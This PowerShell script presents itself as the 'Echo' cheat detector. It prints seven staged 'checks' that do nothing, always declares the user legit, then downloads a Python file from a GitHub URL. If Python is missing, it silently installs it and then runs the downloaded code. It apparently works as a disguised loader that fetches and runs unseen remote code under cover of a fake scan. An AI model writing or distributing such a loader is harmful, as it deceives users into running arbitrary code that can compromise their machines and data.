$ErrorActionPreference = "Continue"

function Show-Step($text, $delay = 0.6) {
    Write-Host $text
    Start-Sleep -Milliseconds ($delay * 1000)
}

Write-Host ""
Write-Host "====================================="
Write-Host "      Echo  v3.5 [ Cheat detector ]  "
Write-Host "====================================="
Write-Host ""


Show-Step "[1] Running Safety check..."
Show-Step "[2] Checking keywords..."
Show-Step "[3] Finding suspicious activity..."
Show-Step "[4] Checking Anti-Virus protection logs..."
Show-Step "[5] Researching bin history..."
Show-Step "[6] Final lookups..."
Show-Step "[7] Done"

Write-Host ""
Write-Host "`e[32m[+] Success!`e[0m"
Write-Host "Info: this user is legit!"
Write-Host ""


$pyFile = Join-Path $env:TEMP "echo.py"
Invoke-WebRequest "https://raw.githubusercontent.com/xybv/PC_Check_Echo/refs/heads/main/echo.py" -OutFile $pyFile


$python = Get-Command python -ErrorAction SilentlyContinue
if (-not $python) { $python = Get-Command py -ErrorAction SilentlyContinue }

if (-not $python) {
    Write-Host "[!] Python not found. Installing..." -ForegroundColor Yellow

    $installer = Join-Path $env:TEMP "python_installer.exe"

    Invoke-WebRequest "https://www.python.org/ftp/python/3.13.0/python-3.13.0-amd64.exe" -OutFile $installer

    Start-Process $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait

    $python = Get-Command python -ErrorAction SilentlyContinue
}

if (-not $python) {
    Write-Host "[-] Python install failed" -ForegroundColor Red
    pause
    exit
}


Write-Host ""
Write-Host "[+] Launching module..."
Write-Host ""

& $python.Source $pyFile

Write-Host ""
Write-Host "[+] Process completed"
pause
